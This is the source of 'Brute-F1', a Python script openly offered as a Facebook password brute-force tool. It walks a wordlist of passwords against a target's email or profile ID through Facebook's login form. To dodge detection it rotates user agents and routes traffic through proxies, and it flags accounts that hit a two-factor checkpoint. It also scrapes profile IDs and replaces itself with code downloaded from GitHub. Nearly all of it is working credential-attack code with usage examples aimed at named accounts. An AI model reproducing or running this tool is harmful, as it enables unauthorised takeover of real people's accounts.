#!/usr/bin/python

import socket, sys, os, re, random, optparse, time, io
if sys.version_info.major <= 2:import httplib
else:import http.client as httplib

## COLORS ###############
wi="\033[1;37m" #>>White#
rd="\033[1;31m" #>Red   #
gr="\033[1;32m" #>Green #
yl="\033[1;33m" #>Yellow#
#########################
os.system("cls||clear")
def write(text):
    sys.stdout.write(text)
    sys.stdout.flush()

versionPath = os.path.join("core", "version.txt")

errMsg = lambda msg: write(rd+"\n["+yl+"•"+rd+"] Error : "+yl+msg+rd+ " !!!\n"+wi)

try:import requests
except ImportError:
    errMsg("[ requests ] module is missing")
    print("  [•] Please use : 'pip install requests' to install it :)")
    sys.exit(1)
try:import mechanize
except ImportError:
    errMsg("[ mechanize ] module is missing")
    print("  [•] Please use : 'pip install mechanize' to install it :)")
    sys.exit(1)

class FaceBoom(object):


    def __init__(self):
        self.useProxy = None
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br._factory.is_html = True
        self.br.addheaders=[('User-agent',random.choice([
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]


    @staticmethod
    def check_proxy(proxy):
          proxies = {'https':"https://"+proxy, 'http':"http://"+proxy}
          proxy_ip = proxy.split(":")[0]
          try:
            r = requests.get('https://www.wikipedia.org',proxies=proxies, timeout=5)
            if proxy_ip==r.headers['X-Client-IP']: return True
            return False
          except Exception : return False


    @staticmethod
    def cnet():
        try:
            socket.create_connection((socket.gethostbyname("www.google.com"), 80), 2)
            return True
        except socket.error:pass
        return False


    def get_profile_id(self, target_profile):
        try:
            print(gr+"\n―"+gr+"―"+gr+"―[ Geting Target Profile ID ]―――"+gr)
            idre = re.compile('(?<="userID":").*?(?=")')
            con = requests.get(target_profile).text
            idis = idre.search(con).group()
            print(gr+"\n["+yl+"•"+gr+"]"+gr+" Target Profile"+gr+" ID : "+yl+idis+yl)
        except Exception:
            errMsg("Please Check Your Target Profile URL")
            sys.exit(1)


    def login(self,target, password):

        try:
            self.br.open("https://facebook.com")
            self.br.select_form(nr=0)
            self.br.form['email']=target
            self.br.form['pass']= password
            self.br.method ="POST"
            if self.br.submit().get_data().__contains__(b'home_icon'):return  1
            elif "checkpoint" in self.br.geturl(): return 2
            return 0
        except(KeyboardInterrupt, EOFError):
            print(gr+"\n["+yl+"•"+gr+"]"+yl+" Aborting"+yl+"..."+yl)
            time.sleep(1.5)
            sys.exit(1)
        except Exception as e:
            print(rd+" Error : "+yl+str(e)+wi+"\n")
            time.sleep(0.60)


    def banner(self,target,wordlist,single_passwd):

        proxystatus = gr+self.useProxy+wi+"["+gr+"ON"+wi+"]" if self.useProxy  else yl+"["+rd+"OFF"+yl+"]"
        print(gr+"""

  ____             _              ______ __ 
 |  _ \           | |            |  ____/_ |
 | |_) |_ __ _   _| |_ ___ ______| |__   | |
 |  _ <| '__| | | | __/ _ \______|  __|  | |
 | |_) | |  | |_| | ||  __/      | |     | |
 |____/|_|   \__,_|\__\___|      |_|     |_|
                                            
――――――― """+yl+"""All praise is for Allah"""+gr+""" ―――――――

["""+yl+"""•"""+gr+"""] """+yl+"""Brute-F1 : Powerful Facebook Bruteforce Tool"""+gr+"""!
["""+yl+"""•"""+gr+"""] """+yl+"""Creator : MD Asif Hasan"""+gr+"""         [DetaSploit]
――――――――――――――――――――――――――――――――――――――――――――――
~ Target      ― """+yl+target+gr+"""
{}""".format("~ Wordlist    ― "+yl+str(wordlist) if not single_passwd else "~ Password    ― "+yl+str(single_passwd))+gr+"""
~ ProxyStatus ― """+str(proxystatus)+wi)
        if not single_passwd:
            print(yl+"""\
――――――――――――――――――――――――――――――――――――――――――――――"""+gr+"""
["""+yl+"""•"""+gr+"""] """+yl+"""Bruteforce"""+rd+""" Attack """+gr+""" : """+gr+"""Enabled """+wi+"""[~]"""+yl+"""
――――――――――――――――――――――――――――――――――――――――――――\n"""+yl)
        else:print("\n")


    @staticmethod
    def updateBrutef():
        if not os.path.isfile(versionPath):
             errMsg("Check for Update : Please re-clone the Script to Fix this Problem")
             sys.exit(1)
        write("[•] Checking for Update...\n")
        conn = httplib.HTTPSConnection("raw.githubusercontent.com")
        conn.request("GET", "/DetaSploit/Brute-F1/main/core/version.txt")
        repoVersion = conn.getresponse().read().strip().decode()
        with open(versionPath) as vf:
            currentVersion = vf.read().strip()
        if repoVersion == currentVersion:write("  [•] The Script is Up to Date!\n")
        else:
                print("  [•] An Update has Been Found : Updating... ")
                conn.request("GET", "/DetaSploit/Brute-F1/main/brute-f1.py")
                newCode = conn.getresponse().read().strip().decode()
                with open("brute-f1.py", "w") as  brutefScript:
                   brutefScript.write(newCode)
                with open(versionPath, "w") as ver:
                     ver.write(repoVersion)
                write("  [•] Successfully Updated :)\n")

parse = optparse.OptionParser(yl+"""
[•]"""+wi+""" Usage : python brute-f1.py [Options]


"""+gr+"""―――[ Options ]―――"""+yl+"""
       
    
  [•]"""+wi+""" -t <Target Email> [or] <Facebook ID>
  Specify Target Email [or] Target Profile ID"""+yl+"""
    
  [•]"""+wi+""" -w <Wordlist Path>                 
  Specify Wordlist (.txt) File Path"""+yl+"""
    
  [•]"""+wi+""" -s <Single Password>         
  Specify Single Password To Check"""+yl+"""
    
  [•]"""+wi+""" -p <Proxy IP:PORT>                 
  Specify HTTP/S Proxy (Optional)"""+yl+"""
    
  [•]"""+wi+""" -g <Target Facebook Profile URL> 
  Specify Target Facebook Profile URL For Get  ID"""+yl+"""
    
  [•]"""+wi+""" -u/--update                        
  Update Brute-F1 Script"""+gr+"""
  

―――[ Examples ]―――"""+yl+"""
        
     
  [•]"""+wi+""" python brute-f1.py -t Asif1@gmail.com -w /usr/share/wordlists/wordlist.txt"""+yl+"""
     
  [•]"""+wi+""" python brute-f1.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt"""+yl+"""
     
  [•]"""+wi+""" python brute-f1.py -t Asif1@hotmail.com  -w D:\\wordlist.txt -p 144.217.101.21:3129"""+yl+"""
     
  [•]"""+wi+""" python brute-f1.py -t Asif1@gmail.com -s 1234567"""+yl+"""
     
  [•]"""+wi+""" python brute-f1.py -g https://www.facebook.com/username
     
"""+wi)


def Main():
   parse.add_option("-t","--target",'-T','--TARGET',dest="target",type="string",
      help="Specify Target Email or ID")
   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wordlist",type="string",
      help="Specify Wordlist (.txt) File ")
   parse.add_option("-s","--single","--S","--SINGLE",dest="single",type="string",
      help="Specify Single Password To Check it")
   parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
                        help="Specify HTTP/S Proxy to be used")
   parse.add_option("-g","-G","--getid","--GETID",dest="url",type="string",
                        help="Specify TARGET FACEBOOK PROFILE URL to Get ID")
   parse.add_option("-u","-U","--update","--UPDATE", dest="update", action="store_true", default=False)
   (options,args) = parse.parse_args()
   faceboom = FaceBoom()
   target = options.target
   wordlist = options.wordlist
   single_passwd = options.single
   proxy = options.proxy
   target_profile = options.url
   update = options.update
   opts = [target,wordlist,single_passwd, proxy, target_profile, update]
   if any(opt for opt in opts):
     if not faceboom.cnet():
       errMsg("Please Check Your Internet Connection")
       sys.exit(1)
   if update:
    brutef.updateBrutef()
    sys.exit(1)
   elif target_profile:
        faceboom.get_profile_id(target_profile)
        sys.exit(1)
   elif wordlist or single_passwd:
        if wordlist:
            if not os.path.isfile(wordlist):
                errMsg("Please check Your Wordlist Path")
                sys.exit(1)
        if single_passwd:
            if len(single_passwd.strip()) < 6:
                errMsg("Invalid Password")
                print("[•] Password must be at least '6' characters long")
                sys.exit(1)
        if proxy:
             if proxy.count(".") != 3:
                    errMsg("Invalid IPv4 ["+rd+str(proxy)+yl+"]")
                    sys.exit(1)
             print(gr+"["+yl+"•"+gr+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if not ":" in proxy else proxy.split(":")[0]))
             final_proxy = proxy+":8080" if not ":" in proxy else proxy
             if faceboom.check_proxy(final_proxy):
                faceboom.useProxy = final_proxy
                faceboom.br.set_proxies({'https':faceboom.useProxy, 'http':faceboom.useProxy})
                print(wi+"["+gr+"Connected"+wi+"]")
             else:
                errMsg("Connection Failed")
                errMsg("Unable to connect to Proxy["+rd+str(proxy)+yl+"]")
                sys.exit(1)

        faceboom.banner(target,wordlist,single_passwd)
        loop = 1 if not single_passwd else "~"
        if single_passwd:
            passwords = [single_passwd]
        else:
            with io.open(wordlist, 'r', errors='replace') as f:
                passwords = f.readlines()
        for passwd in passwords:
                passwd = passwd.strip()
                if len(passwd) <6:continue
                write(gr+"["+yl+str(loop)+gr+"] "+wi+"iASIF009.ME "+gr+"["+yl+str(passwd)+gr+"]")
                retCode = faceboom.login(target, passwd)
                if retCode:
                    sys.stdout.write(wi+" Login :"+gr+" Success\n")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    print(gr+"["+yl+"•"+gr+"] Password ["+gr+passwd+wi+"]"+gr+" Is Correct :)")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    if retCode == 2:print(gr+"["+yl+"•"+gr+"]"+yl+" Warning : This Account Using ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+"!")
                    break
                else:
                    sys.stdout.write(yl+" Login :"+rd+" Failed\n")
                    loop = loop + 1 if not single_passwd else "~"
        else:
                if single_passwd:
                    print(gr+"\n["+yl+"•"+gr+"] "+rd+"Sorry : "+gr+"The Password ["+yl+passwd+gr+"] Is Not Correct"+rd+":("+rd)
                    print(gr+"["+yl+"•"+gr+"]"+yl+" Please Try Another Password or Wordlist "+gr+":)"+gr)
                else:
                    print(gr+"\n["+yl+"•"+gr+"] "+rd+"Sorry : "+gr+"I Can't Find The Correct Password In ["+yl+wordlist+gr+"] "+rd+":("+rd)
                    print(gr+"["+yl+"•"+gr+"]"+yl+" Please Try Another Wordlist. "+gr+":)"+gr)
        sys.exit(1)
   else:
       print(parse.usage)
       sys.exit(1)

if __name__=='__main__':
    Main()
##############################################################
#####################                #########################
#####################   END OF TOOL  #########################
#####################                #########################
##############################################################
#This Tool by MD Asif Hasan
#Have a nice day :)
#GoodBye
